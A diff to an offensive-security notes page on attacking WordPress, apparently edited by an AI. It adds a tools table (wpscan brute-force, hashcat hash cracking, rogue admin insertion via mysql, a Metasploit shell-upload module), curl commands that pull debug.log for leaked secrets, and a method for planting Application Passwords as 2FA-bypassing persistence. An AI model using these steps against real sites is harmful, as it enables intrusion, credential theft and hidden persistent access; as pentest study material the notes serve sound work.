@@ -1,3 +1,5 @@
+# WordPress
+
 #WordPress #WP #CMS #webservices #wpscan
 
 ## What is WordPress?
@@ -8,6 +10,20 @@ Most widely deployed CMS — powers ~40% of the web. PHP-based, MySQL backend. A
 - Config file: `wp-config.php` — contains DB credentials
 - Admin panel: `/wp-admin/` or `/wp-login.php`
 - XML-RPC: `/xmlrpc.php`
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Web/wpscan\|wpscan]] | Core enum — users, plugins/themes + versions, vuln matching (`--api-token`), login/xmlrpc brute |
+| [[Tools/File Transfer/cURL\|cURL]] | Manual enum (REST API, `?author=`, xmlrpc), login, wp-config backup hunting |
+| [[Tools/Scanning/NMAP\|nmap]] | `http-wordpress-enum`/`http-wordpress-users` NSE |
+| [[Tools/Scanning/searchsploit\|searchsploit]] | Offline exploit lookup by plugin/theme name+version |
+| [[Tools/Auth/hashcat\|hashcat]] | Crack phpass `wp_users` hashes (`-m 400`) |
+| [[Tools/Database/mysql\|mysql]] | Direct DB access with wp-config creds → dump/insert admin |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `exploit/unix/webapp/wp_admin_shell_upload` |
 
 ---
 
@@ -236,6 +252,23 @@ searchsploit wordpress <plugin_name>
 curl http://<target>/wp-cron.php?doing_wp_cron
 ```
 
+### debug.log Disclosure & Application-Password Persistence
+
+```bash
+# WP_DEBUG_LOG writes to a world-readable log under the web root — paths, SQL errors,
+# and sometimes credentials/tokens leak here. Quick, unauth recon win.
+curl -s http://<target>/wp-content/debug.log
+curl -s http://<target>/wp-content/uploads/debug.log
+```
+
+**Application Passwords (WP 5.6+) for persistence.** Once you have admin (or via a compromised session), mint an Application Password — a REST/XML-RPC credential that survives password resets and typically **bypasses the 2FA plugin** on the web UI. Then authenticate to the REST API with HTTP Basic:
+
+```bash
+# Create via authenticated REST call (admin cookie/nonce), or Users → Profile → Application Passwords
+curl -s -u '<admin>:<app-password>' http://<target>/wp-json/wp/v2/users/me
+# The app password is shown once as "xxxx xxxx xxxx xxxx xxxx xxxx" — usable as Basic auth forever
+```
+
 ### Database Access → Admin Hash
 
 ```bash
@@ -259,7 +292,7 @@ VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
 
 ---
 
-## Dangerous Settings / Misconfigurations
+## Dangerous Settings
 
 | Setting | Risk |
 |---|---|
@@ -270,7 +303,8 @@ VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
 | Outdated plugins/themes | Known CVE exploitation |
 | `wp-config.php` readable via LFI | DB credentials, secret keys |
 | REST API user enumeration enabled | Username list without auth |
-| Debug mode enabled (`WP_DEBUG`) | Path/error disclosure |
+| Debug mode enabled (`WP_DEBUG`/`WP_DEBUG_LOG`) | Path/error disclosure via `wp-content/debug.log` |
+| Application Passwords enabled | Post-admin persistence, bypasses UI 2FA |
 
 ---
 
@@ -286,3 +320,11 @@ VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
 | Admin → RCE (MSF) | `exploit/unix/webapp/wp_admin_shell_upload` |
 | WP hash crack | `hashcat -m 400 hashes.txt rockyou.txt` |
 | DB user insert | `INSERT INTO wp_users ... + wp_usermeta administrator` |
+| debug.log leak | `curl -s http://host/wp-content/debug.log` |
+| App-password persistence | `curl -u admin:<app-pass> http://host/wp-json/wp/v2/users/me` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-25*
+*Model: claude-opus-4-8*
